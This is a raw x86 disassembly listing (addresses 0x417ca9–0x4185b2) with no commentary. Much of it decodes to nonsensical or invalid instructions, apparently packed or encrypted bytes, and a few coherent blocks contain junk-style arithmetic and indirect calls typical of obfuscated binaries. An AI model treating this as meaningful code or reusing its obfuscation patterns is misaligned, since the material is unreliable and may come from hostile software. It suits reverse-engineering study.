  417ca9:	ficom  DWORD PTR [ecx-0x7da9b68e]
  417caf:	push   edx
  417cb0:	push   0x5e65d31a
  417cb5:	cld    
  417cb6:	aaa    
  417cb7:	or     edx,DWORD PTR [edi+edi*4+0x60]
  417cbb:	mov    bh,BYTE PTR [edi-0x5d]
  417cbe:	dec    ebp
  417cbf:	iret   
  417cc0:	pop    es
  417cc1:	cld    
  417cc2:	xor    BYTE PTR [eax+0x364a3498],bh
  417cc8:	dec    eax
  417cc9:	mov    eax,ds:0x95cf78d1
  417cce:	inc    ebp
  417ccf:	into   
  417cd0:	out    0xe5,al
  417cd2:	mov    edi,0x255793db
  417cd7:	fild   WORD PTR [ecx+edx*2+0x7c]
  417cdb:	mov    ch,0x7a
  417cdd:	(bad)  
  417cde:	fdivr  QWORD PTR [bp+si]
  417ce1:	pop    ds
  417ce2:	(bad)  
  417ce3:	xlat   BYTE PTR ds:[ebx]
  417ce4:	xor    edi,DWORD PTR [edx]
  417ce6:	xor    ebp,DWORD PTR [edx]
  417ce8:	mov    cl,0x43
  417cea:	mov    ?,ebx
  417cec:	call   esi
  417cee:	imul   ebx,DWORD PTR [ebx+0x3c],0x36
  417cf2:	pop    ecx
  417cf3:	inc    esi
  417cf4:	dec    ecx
  417cf5:	sti    
  417cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cf7:	and    DWORD PTR [ebx-0x7c],ecx
  417cfa:	dec    esi
  417cfb:	mov    ebx,0x8c12913b
  417d00:	adc    al,BYTE PTR [edi]
  417d02:	cmp    dl,bl
  417d04:	retf   
  417d05:	sub    edx,DWORD PTR [ebx-0x33]
  417d08:	and    eax,0x12e04ae4
  417d0d:	jmp    0x417d1d
  417d0f:	lea    eax,ds:0x2b104e05
  417d15:	adc    al,0xfb
  417d17:	hlt    
  417d18:	dec    eax
  417d19:	arpl   WORD PTR [edi-0x7f],ax
  417d1c:	sub    BYTE PTR [edx],ah
  417d1e:	mov    ah,BYTE PTR [edx+0x2c8417a3]
  417d24:	xor    eax,0x9aee67cd
  417d29:	xor    BYTE PTR ds:0xb6094915,bl
  417d2f:	pop    esi
  417d30:	xor    eax,0x4bd042ef
  417d35:	sbb    al,dl
  417d37:	push   ebp
  417d38:	mov    WORD PTR [eax+esi*1],ss
  417d3b:	pop    edx
  417d3c:	ds test ch,ch
  417d3f:	into   
  417d40:	jge    0x417d64
  417d42:	jnp    0x417dc1
  417d44:	pop    ds
  417d45:	cmp    al,0x1e
  417d47:	mov    ds:0x50f26ad0,eax
  417d4c:	dec    eax
  417d4d:	pop    edi
  417d4e:	clc    
  417d4f:	sbb    eax,0xa218743b
  417d54:	lea    sp,[esi-0x62]
  417d58:	loope  0x417d56
  417d5a:	(bad)  
  417d5c:	adc    ch,BYTE PTR [ebx]
  417d5e:	ret    
  417d5f:	mov    edi,0x4a0310f8
  417d64:	xlat   BYTE PTR ds:[ebx]
  417d65:	out    dx,eax
  417d66:	jmp    FWORD PTR [edi+0x34]
  417d69:	jnp    0x417d50
  417d6b:	xor    BYTE PTR [edi-0x7ef84699],bh
  417d71:	fcom   QWORD PTR [ebx]
  417d73:	test   bl,ah
  417d75:	dec    eax
  417d76:	push   ax
  417d78:	xchg   eax,esi
  417d7a:	jb     0x417d68
  417d7c:	push   ebx
  417d7d:	and    al,0xe4
  417d7f:	arpl   WORD PTR [esi],cx
  417d81:	and    BYTE PTR [edi-0x10],dl
  417d84:	push   edx
  417d85:	call   0x5f08e562
  417d8a:	bound  ebx,QWORD PTR ds:0x6f44f3c2
  417d90:	es jmp 0xce62:0xe752db24
  417d98:	aas    
  417d99:	nop
  417d9a:	ret    0x63b5
  417d9d:	cwde   
  417d9e:	push   ds
  417d9f:	mov    ds:0x151b2f3d,eax
  417da4:	pandn  mm7,QWORD PTR [ebp-0x5d]
  417da8:	adc    cl,BYTE PTR [ecx]
  417daa:	adc    BYTE PTR [edi+0x21],ch
  417dad:	lea    eax,ds:[edx-0x20]
  417db1:	add    DWORD PTR [edx],esi
  417db3:	je     0x417da4
  417db5:	mov    al,ds:0x7b9371d9
  417dba:	adc    ebp,ebp
  417dbc:	jae    0x417d4e
  417dbe:	(bad)  
  417dc0:	lods   eax,DWORD PTR ds:[esi]
  417dc1:	jp     0x417dab
  417dc3:	test   BYTE PTR [ebx+0x70ba44a3],dl
  417dc9:	bound  esp,QWORD PTR [edi-0x61]
  417dcc:	les    edi,FWORD PTR [edx-0x36]
  417dcf:	pop    ecx
  417dd0:	cld    
  417dd1:	mov    eax,0xc20e07d2
  417dd6:	xchg   esp,eax
  417dd7:	in     al,0xd3
  417dd9:	inc    ecx
  417dda:	cld    
  417ddb:	movups xmm1,XMMWORD PTR [eax+0xa72c486]
  417de2:	xchg   ecx,eax
  417de3:	add    edx,DWORD PTR [eax+0x5c]
  417de6:	outs   dx,BYTE PTR ds:[esi]
  417de7:	sbb    ch,BYTE PTR [esi+ecx*2]
  417dea:	xchg   edi,eax
  417deb:	jmp    0x417dd2
  417ded:	test   al,0x24
  417def:	sub    BYTE PTR [edi+0x4a],al
  417df2:	and    DWORD PTR [edx],0xae7dd121
  417df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df9:	push   cs
  417dfa:	lds    eax,FWORD PTR [eax-0x246f455]
  417e00:	mov    cl,0xd3
  417e02:	mov    ah,0xb8
  417e04:	mov    edx,0x2f669898
  417e09:	push   ds
  417e0a:	imul   ebx,DWORD PTR [edi-0x3a],0x38466024
  417e11:	sbb    BYTE PTR [eax],ch
  417e13:	mov    ds:0x736c35c,al
  417e18:	jmp    0x6e79a145
  417e1d:	in     eax,dx
  417e1e:	and    DWORD PTR [ebx+0x27318ca5],ecx
  417e24:	imul   ebp,DWORD PTR [ecx-0x31],0xe
  417e28:	pop    ds
  417e29:	add    edi,DWORD PTR [ebx-0x1d]
  417e2c:	scas   eax,DWORD PTR es:[edi]
  417e2d:	sar    ch,cl
  417e2f:	pushf  
  417e30:	pushf  
  417e31:	fsubr  st(2),st
  417e33:	pop    es
  417e34:	push   esi
  417e35:	fadd   QWORD PTR fs:[eax-0x10eb2d5e]
  417e3c:	xor    esi,edi
  417e3e:	in     eax,0x15
  417e40:	test   BYTE PTR [eax],dh
  417e42:	xor    BYTE PTR [edi-0x10],0x9
  417e46:	cmp    ah,BYTE PTR [esi+ebx*8]
  417e49:	jnp    0x417dcf
  417e4b:	lea    ecx,[esi+0x1f]
  417e4e:	pop    ebx
  417e4f:	or     ah,BYTE PTR [ebx+ecx*1]
  417e52:	jge    0x417e5f
  417e54:	dec    esi
  417e55:	add    eax,0x5248ba64
  417e5a:	dec    edi
  417e5b:	pop    edx
  417e5c:	aas    
  417e5d:	add    BYTE PTR [ecx+0x241d445a],bl
  417e63:	adc    BYTE PTR [edx],ch
  417e65:	mov    edx,0xd3f04779
  417e6a:	mov    al,0xf
  417e6c:	jo     0xe2680f98
  417e72:	loop   0x417e24
  417e74:	ret    0xf33c
  417e77:	mov    ecx,0xf0c10b35
  417e7c:	int3   
  417e7d:	add    DWORD PTR [ecx+ebp*1+0x79017126],edx
  417e84:	aaa    
  417e85:	daa    
  417e86:	pop    ebp
  417e87:	ror    BYTE PTR [ebx-0x24d8834],0xf
  417e8e:	push   ebx
  417e8f:	adc    al,0x53
  417e91:	or     ch,BYTE PTR [eax+0x6164355a]
  417e97:	cdq    
  417e98:	push   0xe6aede12
  417e9d:	dec    ecx
  417e9e:	inc    edi
  417e9f:	sbb    al,0x81
  417ea1:	or     eax,DWORD PTR [edx]
  417ea3:	jp     0x417ea6
  417ea5:	das    
  417ea6:	or     DWORD PTR [ebx-0xc],0x1c
  417eaa:	pop    eax
  417eab:	jmp    0xdf2874b5
  417eb0:	mov    al,0xa9
  417eb2:	mov    DWORD PTR [esp+0x3c],0x63d5
  417eba:	mov    DWORD PTR ds:0x42835f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428223,0x42827b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428373,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42826f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42836b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428373,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e78
  417f43:	sub    DWORD PTR ds:0x428247,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42822b
  417f53:	mov    ecx,DWORD PTR ds:0x42828b
  417f59:	and    DWORD PTR ds:0x428187,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428363
  417f65:	mov    ecx,DWORD PTR ds:0x428177
  417f6b:	or     DWORD PTR ds:0x42830b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42838f
  417f77:	or     DWORD PTR ds:0x428277,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0xffffffa8
  417f8f:	add    DWORD PTR [ebp+0x16d953bc],edx
  417f95:	sbb    BYTE PTR [edx+edx*1-0x3f7ee7e8],bh
  417f9c:	add    bh,bl
  417f9e:	add    DWORD PTR [edi],ebp
  417fa0:	sahf   
  417fa1:	sub    ebp,DWORD PTR [esi+0x271a87de]
  417fa7:	lods   eax,DWORD PTR ds:[esi]
  417fa8:	out    0x98,eax
  417faa:	sub    eax,0x732c15f9
  417faf:	lock in eax,0x4f
  417fb2:	test   BYTE PTR [ebx-0x19],0xf2
  417fb6:	in     al,dx
  417fb7:	pop    edx
  417fb8:	loopne 0x417faf
  417fba:	clc    
  417fbb:	cmp    ax,0x5484
  417fbf:	add    eax,0x69f43d23
  417fc4:	xchg   ecx,eax
  417fc5:	push   edx
  417fc6:	dec    eax
  417fc7:	xchg   ebp,eax
  417fc8:	xlat   BYTE PTR ds:[ebx]
  417fc9:	push   edx
  417fca:	xor    ch,dl
  417fcc:	daa    
  417fcd:	jle    0x417f51
  417fcf:	fcomp  QWORD PTR [ecx+0x6e]
  417fd2:	test   DWORD PTR [edi+eiz*8],eax
  417fd5:	xor    ah,BYTE PTR [esp+edx*8+0xa]
  417fd9:	pop    edx
  417fda:	sub    ah,BYTE PTR [ecx+edi*1]
  417fdd:	xchg   DWORD PTR [ecx+0xfcb75e5],edi
  417fe3:	adc    ebx,DWORD PTR [ecx-0x3c612ad2]
  417fe9:	lds    edi,FWORD PTR [edi+0x2b8ef003]
  417fef:	pop    es
  417ff0:	mov    al,BYTE PTR [edi]
  417ff2:	pop    eax
  417ff3:	popa   
  417ff4:	push   0xffffffba
  417ff6:	fdivr  QWORD PTR [edi+0x12b34a3]
  417ffc:	iret   
  417ffd:	sbb    DWORD PTR ds:0xbccc2f83,edx
  418003:	push   cs
  418004:	mov    ebp,0xb20e41aa
  418009:	enter  0x8d2b,0x13
  41800d:	jl     0x417fe5
  41800f:	imul   ebx,DWORD PTR [edi+0x112dc966],0x1ae94fcf
  418019:	in     al,0x24
  41801b:	rcl    BYTE PTR [ecx-0x610530d6],0x4c
  418022:	mov    ds:0x3a1d399c,eax
  418027:	(bad)  
  418028:	mov    eax,0x231eedf0
  41802d:	cmp    DWORD PTR [ebx+0x7a],eax
  418030:	add    BYTE PTR [eax],0x88
  418033:	ins    DWORD PTR es:[edi],dx
  418034:	xchg   ecx,eax
  418035:	xor    bh,bh
  418037:	fimul  WORD PTR [esi-0x2f]
  41803a:	mov    al,ds:0x54d08be9
  41803f:	mov    dh,0x8c
  418041:	aam    0x2e
  418043:	(bad)
  418046:	mov    ds:0x158c93f1,eax
  41804b:	mov    BYTE PTR [ebp+0x6a],cl
  41804e:	xor    DWORD PTR [esi+0x17],eax
  418051:	mov    ecx,0xf8d87002
  418056:	push   ds
  418057:	test   eax,0x86e50017
  41805c:	xor    eax,0x2fcd1a55
  418061:	lods   al,BYTE PTR ds:[esi]
  418062:	jnp    0x417ff4
  418064:	and    eax,0xd5d62579
  418069:	mov    ecx,0xba9d71f4
  41806e:	inc    ebp
  41806f:	add    BYTE PTR [edi],ch
  418071:	(bad)  [esi+0x32]
  418074:	les    eax,FWORD PTR [eax+0x58c35245]
  41807a:	jbe    0x41805e
  41807c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41807d:	repnz adc BYTE PTR [ebp-0x4fa90a20],bl
  418084:	in     eax,0x63
  418086:	xor    al,0xcb
  418088:	fsub   DWORD PTR [ebp-0x14f778f0]
  41808e:	dec    ebx
  41808f:	in     eax,dx
  418090:	xor    al,0xaa
  418092:	push   ebp
  418093:	pushf  
  418094:	mov    eax,ds:0xb67dd475
  418099:	and    eax,0xe942c6f9
  41809e:	jo     0x418069
  4180a0:	rcr    DWORD PTR [eax+0x6506d4af],1
  4180a6:	xor    WORD PTR [ebp+esi*1+0x5649148e],ax
  4180ae:	sub    BYTE PTR ds:0xca984b38,ah
  4180b4:	mov    edx,0xf130d0bc
  4180b9:	shl    ch,0x6a
  4180bc:	enter  0x1a16,0x27
  4180c0:	test   esp,esp
  4180c2:	mov    edi,DWORD PTR [edi-0x21]
  4180c5:	xchg   BYTE PTR [ebx+0x66aed630],bl
  4180cb:	cli    
  4180cc:	aam    0xf4
  4180ce:	fwait
  4180cf:	add    DWORD PTR [ecx+edi*1-0x77c41ad7],esp
  4180d6:	scas   eax,DWORD PTR es:[edi]
  4180d7:	push   edi
  4180d8:	pop    edx
  4180d9:	fcom   st(1)
  4180db:	sub    eax,0x66a70df3
  4180e0:	jecxz  0x41815a
  4180e2:	rcr    esp,0x2b
  4180e5:	aas    
  4180e6:	mov    edx,0x2dc653de
  4180eb:	in     eax,dx
  4180ec:	add    bl,BYTE PTR [eax-0x6cd961b6]
  4180f2:	mov    al,0x2c
  4180f4:	pop    ds
  4180f5:	jecxz  0x4180c8
  4180f7:	(bad)  
  4180f9:	imul   eax,DWORD PTR [eax+0x151fc756],0x8d165e1d
  418103:	loopne 0x4180a9
  418105:	(bad)  
  418106:	pop    edx
  418107:	cmp    bh,BYTE PTR [edx]
  418109:	(bad)  
  41810a:	sahf   
  41810b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41810c:	test   DWORD PTR [edx],edx
  41810e:	fwait
  41810f:	and    esp,DWORD PTR [ecx+0x7b]
  418112:	jge    0x418162
  418114:	jecxz  0x4180f3
  418116:	arpl   WORD PTR [eax],si
  418118:	adc    BYTE PTR [ebp-0x6bc23815],bl
  41811e:	jne    0x4180ca
  418120:	jge    0x4180b8
  418122:	cdq    
  418123:	neg    al
  418125:	mov    esi,0x19fd98e0
  41812a:	aas    
  41812b:	lahf   
  41812c:	sahf   
  41812d:	sahf   
  41812e:	jbe    0x4180b8
  418130:	fs sti 
  418132:	pop    eax
  418133:	sub    DWORD PTR [edi+0x4c],esp
  418136:	inc    edx
  418137:	xor    bh,bh
  418139:	or     al,ch
  41813b:	fwait
  41813c:	enter  0x6694,0x3f
  418140:	jnp    0x41810d
  418142:	je     0x6027587b
  418148:	rcr    esp,cl
  41814a:	xchg   DWORD PTR [ebx+0x424f72d0],ebx
  418150:	int    0xca
  418152:	cld    
  418153:	xchg   edi,eax
  418154:	in     eax,0x35
  418156:	xor    ah,bh
  418158:	iret   
  418159:	je     0x418144
  41815b:	loope  0x418161
  41815d:	jg     0x418149
  41815f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418160:	cmp    al,0x26
  418162:	repz pop esi
  418164:	out    0x70,al
  418166:	adc    eax,0x1f754398
  41816b:	mov    dh,0x60
  41816d:	out    0x28,eax
  41816f:	mov    eax,0x52c0a8cd
  418174:	dec    edi
  418175:	and    al,0xdd
  418177:	pop    ebp
  418178:	inc    edx
  418179:	imul   esp,DWORD PTR [ecx],0xab40fa87
  41817f:	(bad)  
  418180:	mov    ebp,0x78fd7a64
  418185:	push   edi
  418186:	xchg   esp,eax
  418187:	dec    esp
  418188:	pop    ebx
  418189:	test   DWORD PTR [edi],ebp
  41818b:	push   ecx
  41818c:	and    eax,0xa121f342
  418191:	xlat   BYTE PTR ds:[ebx]
  418192:	and    ebp,DWORD PTR [ebx]
  418194:	iret   
  418195:	mov    edi,0x89542290
  41819a:	mov    al,ds:0x50448936
  41819f:	xchg   ecx,eax
  4181a0:	add    dl,BYTE PTR [edi]
  4181a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181a3:	add    al,0x31
  4181a5:	sbb    BYTE PTR [ecx+0x7ca4bfcf],cl
  4181ab:	push   ebp
  4181ac:	push   0xce1d61d5
  4181b1:	adc    ch,BYTE PTR [eax+0x34a7776e]
  4181b7:	pusha  
  4181b8:	or     eax,0xf25b3a13
  4181bd:	sahf   
  4181be:	pop    es
  4181bf:	fst    DWORD PTR [edx+0x1c4feec7]
  4181c5:	sub    BYTE PTR [esi+eiz*8+0x46],0x5d
  4181ca:	pop    ss
  4181cb:	dec    ebp
  4181cc:	popf   
  4181cd:	outs   dx,BYTE PTR ds:[esi]
  4181ce:	bound  esi,QWORD PTR [ecx+0x62]
  4181d1:	test   DWORD PTR [edx],esp
  4181d3:	(bad)  
  4181d4:	dec    edx
  4181d5:	dec    edi
  4181d6:	xor    DWORD PTR [edi-0xe],0x314520c
  4181dd:	jmp    0x4181da
  4181df:	ret    
  4181e0:	or     ebx,DWORD PTR [esi+0x78]
  4181e3:	add    bh,BYTE PTR [eax]
  4181e5:	adc    ch,dl
  4181e7:	adc    dl,BYTE PTR [edx+0x2a]
  4181ea:	fs xchg ebp,eax
  4181ec:	lods   al,BYTE PTR ds:[esi]
  4181ed:	hlt    
  4181ee:	(bad)  
  4181f0:	sub    BYTE PTR [eax+0x46],ch
  4181f3:	jbe    0x41822d
  4181f5:	gs jmp 0xe58ed579
  4181fb:	stos   DWORD PTR es:[edi],eax
  4181fc:	mov    ss:0x894be8be,eax
  418202:	into   
  418203:	fnstenv [edx+0x9]
  418206:	and    al,0xa7
  418208:	push   ds
  418209:	ss in  al,dx
  41820b:	mov    ch,0x3a
  41820d:	pushf  
  41820e:	outs   dx,DWORD PTR ds:[esi]
  41820f:	imul   edi,ecx,0x22
  418212:	xchg   edx,eax
  418213:	stos   BYTE PTR es:[edi],al
  418214:	cmc    
  418215:	cld    
  418216:	dec    eax
  418217:	push   edi
  418218:	push   esp
  418219:	pop    es
  41821a:	into   
  41821b:	mov    bl,BYTE PTR [eax-0x44]
  41821e:	pop    ebp
  41821f:	push   esi
  418220:	inc    sp
  418222:	into   
  418223:	dec    ebx
  418224:	je     0x4181d7
  418226:	and    al,0x0
  418228:	xor    edi,DWORD PTR [edi+edx*4-0x1b]
  41822c:	mov    al,ds:0x12ce8366
  418231:	xlat   BYTE PTR ds:[ebx]
  418232:	retf   0x7a09
  418235:	(bad)  
  418236:	cld    
  418237:	jmp    0x41828b
  418239:	xchg   BYTE PTR [edi+ebp*2-0x55],bh
  41823d:	fs popa 
  41823f:	push   edi
  418240:	mov    al,0xb2
  418242:	pop    ss
  418243:	mov    ecx,0x1d87123b
  418248:	mov    esi,0xfaaf8d72
  41824d:	out    dx,al
  41824e:	or     al,BYTE PTR [ebp-0x4e]
  418251:	les    esi,FWORD PTR [ecx+0x6]
  418254:	push   gs
  418256:	mov    bh,0x1b
  418258:	mov    ebx,0x30304971
  41825d:	daa    
  41825e:	xor    BYTE PTR [ebp+0x9],dl
  418261:	cs add ebp,esi
  418264:	in     al,dx
  418265:	cmp    DWORD PTR [eax],0x996985c4
  41826b:	rcl    BYTE PTR [esi+0x5d],0xd5
  41826f:	shr    DWORD PTR ds:0x70335d7a,1
  418275:	dec    esi
  418276:	rcl    edi,cl
  418278:	xor    DWORD PTR [esi],0xffffff82
  41827b:	arpl   WORD PTR [esi-0x75],ax
  41827e:	xlat   BYTE PTR ds:[ebx]
  41827f:	sub    DWORD PTR [ebx+0x9dac5a1],edx
  418285:	or     ecx,DWORD PTR [ecx]
  418287:	mov    WORD PTR [ecx-0x65c426f6],?
  41828d:	addr16 push esp
  41828f:	(bad)  
  418290:	cdq    
  418291:	xchg   BYTE PTR ds:0x51ccdc55,al
  418297:	and    BYTE PTR [ebp+0x2e55bae6],ah
  41829d:	dec    ebx
  41829e:	mov    eax,0xe1f8e997
  4182a3:	xor    al,0xf6
  4182a5:	sub    edi,esi
  4182a7:	xor    al,0xc1
  4182a9:	adc    DWORD PTR [esi+0x24],esi
  4182ac:	or     BYTE PTR [ecx+0x4ba2cc3c],0x91
  4182b3:	stos   DWORD PTR es:[edi],eax
  4182b4:	xchg   esi,eax
  4182b5:	dec    edx
  4182b6:	dec    eax
  4182b7:	mov    DWORD PTR [ebp+0x3c0907fd],0x4ab2504b
  4182c1:	push   cs
  4182c2:	hlt    
  4182c3:	mov    ecx,0x3566e280
  4182c8:	mov    al,ds:0x2bc3d6b
  4182cd:	cdq    
  4182ce:	fs out dx,eax
  4182d0:	mov    ch,0xda
  4182d2:	sbb    DWORD PTR [edx+0xf310b12],ebx
  4182d8:	out    0x7a,al
  4182da:	push   es
  4182db:	outs   dx,DWORD PTR ds:[esi]
  4182dc:	mov    bh,0x67
  4182de:	xor    bh,BYTE PTR ds:0x6359a449
  4182e4:	push   ebp
  4182e5:	mov    al,cl
  4182e7:	xchg   ebx,eax
  4182e8:	sub    DWORD PTR [edi],eax
  4182ea:	lahf   
  4182eb:	cmp    dl,dh
  4182ed:	push   es
  4182ee:	int3   
  4182ef:	je     0x41830d
  4182f1:	clc    
  4182f2:	xchg   ebx,eax
  4182f3:	test   al,0x4c
  4182f5:	dec    edx
  4182f6:	sbb    ebp,DWORD PTR [ebx+ebx*8-0x5a]
  4182fa:	cmp    DWORD PTR [esi+esi*8+0x3b69eb56],edx
  418301:	mov    eax,0xd13a98f2
  418306:	sbb    edi,ecx
  418308:	jns    0x41836b
  41830a:	pop    ds
  41830b:	pop    es
  41830c:	push   es
  41830d:	leave  
  41830e:	sub    BYTE PTR [edi],bh
  418310:	or     eax,esp
  418312:	sub    ch,BYTE PTR [edi]
  418314:	push   ds
  418315:	fild   WORD PTR [ebp-0x7bfb45d7]
  41831b:	pop    ebx
  41831c:	hlt    
  41831d:	xchg   edx,eax
  41831e:	push   ebp
  41831f:	pop    ebx
  418320:	rcr    BYTE PTR [ecx],0xb7
  418323:	push   ds
  418324:	sbb    ecx,DWORD PTR [ebp+eax*1-0x461f8430]
  41832b:	inc    edi
  41832c:	mov    al,0x66
  41832e:	sbb    DWORD PTR [edi],esi
  418330:	add    DWORD PTR [ecx],ebx
  418332:	or     esp,DWORD PTR [ebx]
  418334:	sbb    DWORD PTR [eax+0x6f2db493],esi
  41833a:	shl    BYTE PTR [ebx-0x1a],1
  41833d:	call   0xbcfb:0x935487c1
  418344:	cwde   
  418345:	lea    eax,[ecx+0x45be1623]
  41834b:	popa   
  41834c:	push   DWORD PTR [eax]
  41834e:	mov    eax,DWORD PTR [esp+0x34]
  418352:	cmp    DWORD PTR ds:0x428177,0x0
  418359:	mov    DWORD PTR ds:0x42823b,0x42c6
  418363:	mov    DWORD PTR ds:0x428377,edx
  418369:	mov    DWORD PTR ds:0x428153,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428277,0x243f
  418382:	mov    DWORD PTR ds:0x42824f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428177,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428313
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e7c
  4183ae:	add    DWORD PTR ds:0x4282df,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428263
  4183ba:	xor    DWORD PTR ds:0x428317,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x4282f3
  4183c6:	or     DWORD PTR ds:0x42816f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42821b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42821f,0x42818b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42817f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42837f
  418409:	or     DWORD PTR ds:0x428377,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42814f,0x428317
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42821b,0x0
  418430:	mov    DWORD PTR ds:0x42822b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428373,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42821b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428073
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428dd8
  41846b:	sbb    DWORD PTR ds:0x42825f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428157,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428373
  418485:	xor    ecx,DWORD PTR ds:0x4282db
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428377,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282ef,0x42825b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x428397,0x42821f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282eb,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	pop    ds
  4184f8:	scas   eax,DWORD PTR es:[edi]
  4184f9:	ret    
  4184fa:	jl     0x4184f2
  4184fc:	rcl    DWORD PTR [esi],1
  4184fe:	sbb    BYTE PTR [edx+edx*1-0x7c98e7e8],bh
  418505:	(bad)  
  418506:	loopne 0x4184be
  418508:	adc    BYTE PTR [edx],dl
  41850a:	mov    cl,0xba
  41850c:	pop    esi
  41850d:	lods   eax,DWORD PTR ds:[esi]
  41850e:	sub    DWORD PTR [edx],edi
  418510:	ss mov bh,0xe
  418513:	movhps QWORD PTR [eax-0x4a],xmm4
  418517:	dec    edi
  418518:	mov    ah,0xd
  41851a:	push   ebx
  41851b:	popa   
  41851c:	inc    edx
  41851d:	jl     0x418525
  41851f:	test   eax,0x409b7d7a
  418524:	lds    edx,FWORD PTR [edi-0x1a4fdb60]
  41852a:	sbb    al,BYTE PTR [edx]
  41852c:	or     eax,0xf37728fa
  418531:	jnp    0x418534
  418533:	push   ds
  418534:	xlat   BYTE PTR ds:[ebx]
  418535:	or     al,0x5f
  418537:	out    dx,al
  418538:	pop    ecx
  418539:	mov    dl,0x66
  41853b:	jb     0x418577
  41853d:	dec    ebp
  41853e:	jmp    0x83fc:0xd2d28c93
  418545:	adc    DWORD PTR [ebx+esi*1],eax
  418548:	sbb    ch,al
  41854a:	(bad)  
  41854b:	lahf   
  41854c:	sub    ebp,DWORD PTR [esi-0x7a73df54]
  418552:	mov    gs,WORD PTR es:[ebx]
  418555:	jge    0x41854e
  418557:	jecxz  0x418521
  418559:	ret    
  41855a:	mov    eax,0x1baabad8
  41855f:	add    eax,0xc2e1ca90
  418564:	sub    eax,0x4cb5996c
  418569:	xchg   DWORD PTR [edi],esi
  41856b:	push   ebp
  41856c:	inc    ecx
  41856d:	div    BYTE PTR [si]
  418570:	test   al,0xf3
  418572:	shl    BYTE PTR [eax+0x10],0xea
  418576:	loope  0x418558
  418578:	test   BYTE PTR [ebp-0x5b],al
  41857b:	pushf  
  41857c:	pop    ebx
  41857d:	or     bh,dl
  41857f:	cmc    
  418580:	ins    DWORD PTR es:[edi],dx
  418581:	(bad)  
  418583:	inc    eax
  418584:	pop    edi
  418585:	out    0x80,eax
  418587:	mov    WORD PTR [ebx+0xc],ss
  41858a:	xchg   edi,eax
  41858b:	mov    esi,es
  41858d:	in     al,0x3f
  41858f:	rcr    DWORD PTR [eax],1
  418591:	pop    ecx
  418592:	lds    ebx,FWORD PTR [edx-0x41f16789]
  418598:	repnz out 0x99,eax
  41859b:	ds lock mov ebp,0xca7de36
  4185a2:	(bad)  
  4185a3:	inc    edi
  4185a4:	outs   dx,DWORD PTR ds:[esi]
  4185a5:	enter  0xfcc7,0x3b
  4185a9:	cmp    bh,ah
  4185ab:	mov    edx,DWORD PTR [ecx+esi*4-0xad74cc4]
  4185b2:	push   esi
